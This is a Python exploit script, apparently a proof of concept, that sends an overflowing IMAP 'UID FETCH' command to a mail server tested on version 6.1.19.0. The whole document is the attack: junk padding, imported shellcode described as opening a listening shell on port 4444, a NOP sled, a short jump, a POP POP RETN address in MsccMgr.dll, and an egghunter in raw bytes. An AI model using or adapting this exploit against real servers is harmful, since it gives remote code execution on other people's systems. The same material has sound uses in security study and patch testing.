#!/usr/bin/python
# Tested on 6.1.19.0

from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port):
        b= b"w00tw00t"
        egghunter = b"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7" # this is the marker/tag: w00t
        buffer   = b"A" * 292                    #Junk
        buffer  +=  buf                   #Shellcode of 368 bytes to spawn a shell listening on port 4444 
        buffer  += b"\x90" *81                   #Nop Sled to fill the rest of the buffer after the shellcode 
        buffer  += b"\xEB\x06\x90\x90"           #Short JMP of 6 bytes.
        buffer  += b"\x95\xcb\x0d\x60"           #Memory Address of POP POP RETN sequence at module MsccMgr.dll @ windows server 2003.
        buffer  += egghunter                    #Egg hunter to search for the tag "w00tw00t" and executes the code after it
        buffer  += b"}" *32                      #Junk
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
                s.connect((target_machine,target_port))
        except:         
                s.close()
        s.recv(1024)  
        s.send(b'A013 UID FETCH 4827313:4827313 '+ buffer + b"\r\n")
        s.close()
       